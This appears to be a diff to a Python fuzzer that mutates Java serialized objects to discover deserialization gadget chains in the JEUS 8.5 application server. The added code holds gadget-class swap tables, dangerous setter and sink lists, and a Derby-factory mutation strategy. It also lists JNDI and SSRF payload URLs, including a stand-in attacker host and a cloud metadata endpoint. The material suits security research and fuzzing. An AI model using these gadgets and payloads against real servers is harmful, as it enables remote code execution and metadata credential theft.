@@ -98,10 +98,150 @@ GADGET_CLASS_SWAPS: dict[str, list[str]] = {
     # InvocationHandler swaps
     "sun.reflect.annotation.AnnotationInvocationHandler": [
         "java.beans.EventHandler",
+        # JEUS-specific InvocationHandler (readObject, can proxy HashMap chains)
+        "jeus.ejb.container.JeusRemoteObjectInvocationHandler",
+    ],
+    "java.beans.EventHandler": [
+        "jeus.ejb.container.JeusRemoteObjectInvocationHandler",
     ],
     # NestedMethodProperty ↔ MethodProperty (Vaadin)
     "com.vaadin.data.util.NestedMethodProperty": [
         "com.vaadin.data.util.MethodProperty",
+    ],
+    # ── JEUS 8.5 specific: repackaged commons (com.sun.org.apache.*) ──
+    "org.apache.commons.beanutils.BeanComparator": [
+        "com.sun.org.apache.commons.beanutils.BeanComparator",
+    ],
+    "com.sun.org.apache.commons.beanutils.BeanComparator": [
+        "org.apache.commons.beanutils.BeanComparator",
+        # Post-patch alternatives (commons.jar 제거 후):
+        "com.hazelcast.com.google.common.collect.ByFunctionOrdering",
+        "com.hazelcast.com.google.common.collect.UsingToStringOrdering",
+        "org.eclipse.persistence.internal.helper.DescriptorCompare",
+    ],
+    # JEUS repackaged TemplatesImpl (xsltc.jar, NOT commons.jar)
+    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl": [
+        "org.apache.xalan.xsltc.trax.TemplatesImpl",
+        # PQ element swaps: TemplatesImpl causes CCE with most
+        # JEUS comparators.  These Serializable classes have richer
+        # interaction surface (toString/hashCode side effects, setters).
+        "java.net.URL",                    # hashCode→DNS, toString→URL string
+        "com.sun.rowset.JdbcRowSetImpl",   # setDataSourceName→JNDI
+        "javax.swing.JEditorPane",         # setPage→SSRF
+    ],
+    "org.apache.xalan.xsltc.trax.TemplatesImpl": [
+        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+        "java.net.URL",
+        "com.sun.rowset.JdbcRowSetImpl",
+    ],
+    # ── JEUS Hazelcast Comparators (PriorityQueue trigger) ──
+    "com.hazelcast.com.google.common.collect.ByFunctionOrdering": [
+        "com.hazelcast.com.google.common.collect.UsingToStringOrdering",
+        "com.hazelcast.com.google.common.collect.ComparatorOrdering",
+        "com.hazelcast.com.google.common.collect.NaturalOrdering",
+        "com.hazelcast.com.google.common.collect.ReverseOrdering",
+        "com.hazelcast.com.google.common.collect.NullsFirstOrdering",
+        "com.hazelcast.com.google.common.collect.NullsLastOrdering",
+        "com.hazelcast.com.google.common.collect.CompoundOrdering",
+        "com.hazelcast.function.ComparatorEx",
+        "com.hazelcast.version.MajorMinorVersionComparator",
+    ],
+    "com.hazelcast.com.google.common.collect.UsingToStringOrdering": [
+        "com.hazelcast.com.google.common.collect.ByFunctionOrdering",
+        "com.hazelcast.com.google.common.collect.NaturalOrdering",
+    ],
+    # ── JEUS EclipseLink (MethodAttributeAccessor → TemplatesImpl) ──
+    "org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor": [
+        "org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor",
+    ],
+    "org.eclipse.persistence.internal.descriptors.InstanceVariableAttributeAccessor": [
+        "org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor",
+    ],
+    # EclipseLink mappings (Serializable, rich readObject)
+    "org.eclipse.persistence.mappings.DirectToFieldMapping": [
+        "org.eclipse.persistence.mappings.TransformationMapping",
+        "org.eclipse.persistence.mappings.OneToOneMapping",
+        "org.eclipse.persistence.mappings.AggregateMapping",
+    ],
+    # ── JEUS misc Serializable Comparators ──
+    "org.glassfish.pfl.basic.contain.NaturalComparator": [
+        "com.hazelcast.com.google.common.collect.NaturalOrdering",
+    ],
+    "org.jvnet.hk2.internal.DescriptorComparator": [
+        "org.eclipse.persistence.internal.helper.DescriptorCompare",
+        "org.eclipse.persistence.internal.helper.MappingCompare",
+    ],
+    # ── Jersey repackaged Guava (same patterns) ──
+    "jersey.repackaged.com.google.common.collect.ByFunctionOrdering": [
+        "com.hazelcast.com.google.common.collect.ByFunctionOrdering",
+    ],
+    # ── JNDI-triggering classes (Derby factory → setter dispatch) ──
+    # Derby factory creates ANY class via Class.forName().newInstance(),
+    # then calls setXxx() for each RefAddr — universal setter primitive.
+    "com.sun.rowset.JdbcRowSetImpl": [
+        # JdbcRowSetImpl.setDataSourceName + setAutoCommit → JNDI lookup
+        "org.apache.derby.jdbc.EmbeddedDataSource",
+        "org.apache.derby.jdbc.EmbeddedSimpleDataSource",
+    ],
+    "org.apache.derby.jdbc.ReferenceableDataSource": [
+        # Derby factory itself — className in Reference controls target class
+        "org.apache.derby.jdbc.EmbeddedDataSource",
+        "org.apache.derby.jdbc.EmbeddedSimpleDataSource",
+        "org.apache.derby.jdbc.BlackboxDataSource",
+    ],
+    # ── JEUS ObjectFactory targets (JNDI local factory exploitation) ──
+    # 7 factories accept standard javax.naming.Reference:
+    "jeus.ejb.client.BusinessObjectFactory": [
+        # JNDI relay: reads RefAddr("home.jndiname") → InitialContext.lookup
+        "jeus.ejb.client.EJB3ObjectFactory",
+        "jeus.container.namingenv.URLObjectFactory",
+    ],
+    "jeus.container.managedbean.ManagedBeanFactory": [
+        # loadClass(className).newInstance() — blocked by transient NPE,
+        # but variant payloads may bypass via different field states
+        "jeus.container.namingenv.DataSourceObjectFactory",
+    ],
+    # ── Hazelcast Janino (runtime Java compiler → defineClass) ──
+    "com.hazelcast.org.codehaus.janino.ByteArrayClassLoader": [
+        "com.hazelcast.org.codehaus.janino.JavaSourceClassLoader",
+        "com.hazelcast.org.codehaus.janino.util.ResourceFinderClassLoader",
+    ],
+    # ── JEUS internal classes with custom readObject (scan results) ──
+    # These are high-value targets found via classpath-wide readObject scan.
+    "jeus.ejb.io.SerializableWrapper": [
+        # Wraps serialized objects — may trigger nested deserialization
+        "jeus.ejb.bean.objectbase.IIOPHandleImpl",
+        "jeus.connector.pool.ConnectionPoolInfo",
+    ],
+    # Hazelcast SqlPredicate — parses SQL expressions during readObject
+    "com.hazelcast.query.impl.predicates.SqlPredicate": [
+        "com.hazelcast.internal.json.JsonObject",
+    ],
+    # JMX RMIConnector — readObject triggers JRMP connection (SSRF)
+    "javax.management.remote.rmi.RMIConnector": [
+        "javax.management.remote.JMXServiceURL",
+    ],
+    # Xalan XSLTProcessorApplet — readObject restores URL fields
+    "org.apache.xalan.client.XSLTProcessorApplet": [
+        "com.sun.org.apache.xalan.internal.client.XSLTProcessorApplet",
+    ],
+    "com.sun.org.apache.xalan.internal.client.XSLTProcessorApplet": [
+        "org.apache.xalan.client.XSLTProcessorApplet",
+    ],
+    # JJWT repackaged Jackson — readResolve can resolve methods
+    "jext.com.fasterxml.jackson.databind.deser.impl.MethodProperty": [
+        "jext.com.fasterxml.jackson.databind.deser.SettableAnyProperty",
+        "jext.com.fasterxml.jackson.databind.ser.BeanPropertyWriter",
+    ],
+    # ── EclipseLink connector / JNDI classes ──
+    "org.eclipse.persistence.sessions.JNDIConnector": [
+        # setName(String) + connect() → JNDI lookup(name) → getConnection
+        "org.eclipse.persistence.sessions.DefaultConnector",
+        "org.eclipse.persistence.eis.EISConnectionSpec",
+    ],
+    "org.eclipse.persistence.sessions.DefaultConnector": [
+        # setDriverClassName + setDatabaseURL → DriverManager.getConnection
+        "org.eclipse.persistence.sessions.JNDIConnector",
     ],
 }
 
@@ -112,6 +252,15 @@ METHOD_NAMES: list[str] = [
     "newInstance", "loadClass", "defineClass",
     "getOutputProperties", "newTransformer", "getDatabaseMetaData",
     "execute", "connect", "toString", "getValue",
+    # JEUS 8.5 gadget chain targets (TemplatesImpl / EL / EclipseLink sinks)
+    "getTransletInstance", "compareTo", "apply", "resolve",
+    "initializeAttributes", "getAttributeValueFromObject",
+    "getFunction", "evaluateExpression", "getMethodName",
+    # Derby factory setter-dispatch targets (confirmed via StagedSetterScan)
+    "setDriverClassName", "setDataSourceName", "setAutoCommit",
+    "setPage", "setUrl", "setCommand", "setStyleURL",
+    "setDriverName", "setDatabaseURL", "setJndiPath",
+    "setConfiguration", "setParserClass", "setCatalogClassName",
 ]
 
 # JNDI URLs for sink injection
@@ -120,12 +269,64 @@ JNDI_URLS: list[str] = [
     "rmi://attacker.example/exploit",
     "dns://attacker.example",
     "ldap://127.0.0.1/exploit",
+    # Derby factory → JdbcRowSetImpl JNDI chain (second-order lookup)
+    "ldap://127.0.0.1:1389/derbyref",
+    "rmi://127.0.0.1:1099/derbyref",
+    # Derby factory → JEditorPane HTTP SSRF
+    "http://127.0.0.1:8080/",
+    "http://169.254.169.254/latest/meta-data/",
 ]
 
-# Bean property names
+# Classes with dangerous setters (from StagedSetterScan: no-arg ctor + setXxx
+# referencing forName/exec/eval/lookup/loadClass/defineClass/newTransformer).
+# Derby factory can create any of these and call their setXxx methods.
+DERBY_SETTER_TARGETS: list[str] = [
+    # SSRF / JNDI chains (setter triggers action immediately)
+    "com.sun.rowset.JdbcRowSetImpl",          # setDataSourceName+setAutoCommit→JNDI
+    "javax.swing.JEditorPane",                # setPage(String)→HTTP GET SSRF
+    # Class.forName via setter
+    "jeus.jdbc.driver.blackbox.BlackboxDataSource",  # setDriverClassName→forName
+    "org.apache.derby.jdbc.ReferenceableDataSource",
+    # XSLT / XML chains (setter stores, other method triggers)
+    "org.apache.xalan.client.XSLTProcessorApplet",   # setStyleURL+setDocumentURL
+    "org.apache.xalan.lib.sql.JNDIConnectionPool",   # setJndiPath→lookup
+    "org.apache.xalan.lib.sql.DefaultConnectionPool", # setDriver→forName+getConnection
+    "org.apache.xml.resolver.CatalogManager",         # setCatalogClassName→forName
+    "org.apache.xml.resolver.readers.SAXCatalogReader",  # setParserClass→forName
+    # EclipseLink connector chain
+    "org.eclipse.persistence.sessions.JNDIConnector",       # setName→lookup
+    "org.eclipse.persistence.sessions.DefaultConnector",    # setDriverClassName→getConnection
+    "org.eclipse.persistence.eis.EISConnectionSpec",
+    # JEUS server classes with exec/start/forName
+    "jeus.server.service.MemoryMonitorService",
+    "jeus.servlet.valve.rewrite.RewriteValve",   # setConfiguration→parse
+    "jeus.tool.console.executor.CommandManagerImpl",
+    "jeus.security.impl.installer.KeyStoreManagerService",
+    # Derby network server (getRuntime+exec+connect in constant pool)
+    "org.apache.derby.impl.drda.NetworkServerControlImpl",
+    # ehcache (CopyStrategyConfiguration.setClass→newInstance+loadClass)
+    "net.sf.ehcache.config.CopyStrategyConfiguration",
+    "net.sf.ehcache.CacheManager",
+    # Hazelcast Janino (Java source compiler → defineClass)
+    "com.hazelcast.org.codehaus.janino.ClassBodyEvaluator",
+    # ── JEUS internal classes from readObject scan ──
+    # These have custom readObject/readResolve with interesting behavior
+    "jeus.ejb.container.JeusRemoteObjectInvocationHandler",  # InvocationHandler proxy
+    "jeus.ejb.io.SerializableWrapper",                       # wraps serialized objects
+    "jeus.connector.pool.ConnectionPoolInfo",                 # connection pool config
+    "javax.management.remote.rmi.RMIConnector",              # JRMP SSRF via readObject
+]
+
+# Bean property names — includes Derby setter targets
 BEAN_PROPERTIES: list[str] = [
     "outputProperties", "databaseMetaData", "connection",
     "class", "templateContent", "stylesheetDOM",
+    # Derby factory RefAddr types (mapped to setXxx calls)
+    "driverClassName", "dataSourceName", "autoCommit",
+    "page", "url", "command", "jndiPath",
+    # JEUS JCA factory property names
+    "className", "resourceAdapter", "connectionFactory",
+    "managedConnectionFactoryImpl",
 ]
 
 
@@ -251,18 +452,40 @@ def _find_serialver_offsets(data: bytes) -> list[int]:
 
 _STRATEGY_DEFS: list[tuple[str, float]] = [
     # B1: Class name mutations (highest value — filter bypass + new chains)
-    ("classname_swap",     0.28),  # Swap class to same-interface alternative
-    ("root_swap",          0.18),  # Swap root collection (filter bypass)
+    ("classname_swap",     0.25),  # Swap class to same-interface alternative
+    ("root_swap",          0.15),  # Swap root collection (filter bypass)
     # B2: Field value mutations
-    ("method_inject",      0.15),  # Replace string values with dangerous methods
+    ("method_inject",      0.13),  # Replace string values with dangerous methods
     ("jndi_inject",        0.10),  # Inject JNDI URL into string fields
     ("property_inject",    0.10),  # Inject bean property names
-    # B3: Structure-preserving mutations (no raw byte flips — they crash JVM)
+    # B3: Derby factory composite (class + setter property in one mutation)
+    ("derby_factory",      0.08),  # Swap class to setter target + inject property
+    # B4: Structure-preserving mutations (no raw byte flips — they crash JVM)
     ("serialver_mutate",   0.05),  # Flip bits in serialVersionUID
     ("cross_splice",       0.07),  # Splice section from another corpus entry
-    # B4: String-level havoc (preserves stream structure)
+    # B5: String-level havoc (preserves stream structure)
     ("string_havoc",       0.07),  # Random modifications to string values
 ]
+
+# JEUS live profile: seeds are structurally valid (container-compiled),
+# so class name swapping (which breaks field descriptors) is downweighted.
+# Focus on field value mutation and cross-seed splicing instead.
+_JEUS_LIVE_STRATEGY_DEFS: list[tuple[str, float]] = [
+    ("classname_swap",     0.08),  # ↑ 6→8 (TemplatesImpl→URL/JdbcRowSet swaps 추가)
+    ("root_swap",          0.02),  # ↓ 4→2 (v4: 0% coverage)
+    ("method_inject",      0.22),  # ↑ 20→22 (v4 best: 16 edges from 5k execs)
+    ("jndi_inject",        0.08),
+    ("property_inject",    0.12),
+    ("derby_factory",      0.13),  # ↓ 15→13 (v4: 4 edges, acceptable)
+    ("serialver_mutate",   0.01),  # ↓ 2→1 (v4: 0 edges from 339 execs)
+    ("cross_splice",       0.20),  # ↑ 18→20 (v4: 12 edges, 2nd best)
+    ("string_havoc",       0.14),  # v4: 6 edges, solid
+]
+
+_PROFILES: dict[str, list[tuple[str, float]]] = {
+    "default": _STRATEGY_DEFS,
+    "jeus_live": _JEUS_LIVE_STRATEGY_DEFS,
+}
 
 
 class DeserBinaryMutator:
@@ -270,15 +493,16 @@ class DeserBinaryMutator:
 
     name = "deser_bin"
 
-    def __init__(self, seed: int | None = None) -> None:
+    def __init__(self, seed: int | None = None, profile: str = "default") -> None:
         self.rng = random.Random(seed)
 
-        self._strategy_names: list[str] = [name for name, _ in _STRATEGY_DEFS]
+        defs = _PROFILES.get(profile, _STRATEGY_DEFS)
+        self._strategy_names: list[str] = [name for name, _ in defs]
         self._strategy_methods = [
-            getattr(self, f"_{name}") for name, _ in _STRATEGY_DEFS
+            getattr(self, f"_{name}") for name, _ in defs
         ]
         self._base_weights: list[int] = [
-            max(1, int(w * 100)) for _, w in _STRATEGY_DEFS
+            max(1, int(w * 100)) for _, w in defs
         ]
         self._weights: list[int] = list(self._base_weights)
         self._strategy_finds: list[int] = [0] * len(self._strategy_methods)
@@ -459,7 +683,74 @@ class DeserBinaryMutator:
         new_prop = self.rng.choice(BEAN_PROPERTIES)
         return _replace_string_at(bytes(data), off, ln, new_prop)
 
-    # ── B3: Structural mutations ──────────────────────────────
+    # ── B3: Derby factory composite mutation ─────────────────
+
+    # Setter property→JNDI URL pairs for Derby factory chain seeds.
+    # When Derby factory creates a class via forName+newInstance, it calls
+    # setXxx(value) for each RefAddr.  These pairs represent high-value
+    # setter+value combos that trigger JNDI/SSRF/forName side effects.
+    _DERBY_SETTER_PAYLOADS: list[tuple[str, str]] = [
+        ("dataSourceName", "ldap://127.0.0.1:1389/derbyref"),
+        ("dataSourceName", "rmi://127.0.0.1:1099/derbyref"),
+        ("jndiPath", "ldap://127.0.0.1:1389/derbyref"),
+        ("page", "http://169.254.169.254/latest/meta-data/"),
+        ("page", "http://127.0.0.1:8080/"),
+        ("driverClassName", "com.sun.rowset.JdbcRowSetImpl"),
+        ("driverClassName", "javax.swing.JEditorPane"),
+        ("databaseURL", "ldap://127.0.0.1:1389/derbyref"),
+        ("url", "ldap://127.0.0.1:1389/derbyref"),
+        ("catalogClassName", "com.sun.rowset.JdbcRowSetImpl"),
+        ("parserClass", "com.sun.rowset.JdbcRowSetImpl"),
+        ("styleURL", "http://169.254.169.254/latest/meta-data/"),
+        ("configuration", "ldap://127.0.0.1:1389/derbyref"),
+    ]
+
+    def _derby_factory(
+        self, data: bytearray, corpus: list[Seed],
+    ) -> bytes | None:
+        """Composite mutation: swap class name to a Derby setter target AND inject
+        a setter property name or JNDI URL into a string field.
+
+        This simulates the Derby ReferenceableDataSource.getObjectInstance() path:
+        Class.forName(ref.getClassName()).newInstance() then iterates RefAddr
+        calling setXxx(value) on the instantiated object.
+        """
+        classnames = _find_classnames(bytes(data))
+        strings = _find_all_strings(bytes(data))
+        if not classnames or not strings:
+            return None
+
+        result = bytes(data)
+
+        # Step 1: Replace a class name with a Derby setter target
+        off, ln, _old = self.rng.choice(classnames)
+        new_class = self.rng.choice(DERBY_SETTER_TARGETS)
+        result = _replace_string_at(result, off, ln, new_class)
+
+        # Re-scan strings after the class name replacement (offsets shifted)
+        strings = _find_all_strings(result)
+        if not strings:
+            return result if len(result) <= MAX_OUTPUT_SIZE else None
+
+        # Step 2: Inject a setter property+value pair into string fields
+        prop_name, prop_value = self.rng.choice(self._DERBY_SETTER_PAYLOADS)
+
+        # Find two distinct string slots for property name and value
+        if len(strings) >= 2:
+            idxs = self.rng.sample(range(len(strings)), 2)
+            idxs.sort(reverse=True)  # replace from end to preserve offsets
+            off2, ln2, _ = strings[idxs[0]]
+            result = _replace_string_at(result, off2, ln2, prop_value)
+            off1, ln1, _ = strings[idxs[1]]
+            result = _replace_string_at(result, off1, ln1, prop_name)
+        else:
+            # Only one string slot — inject the value (more impactful)
+            off1, ln1, _ = strings[0]
+            result = _replace_string_at(result, off1, ln1, prop_value)
+
+        return result if len(result) <= MAX_OUTPUT_SIZE else None
+
+    # ── B4: Structural mutations ──────────────────────────────
 
     def _serialver_mutate(
         self, data: bytearray, corpus: list[Seed],
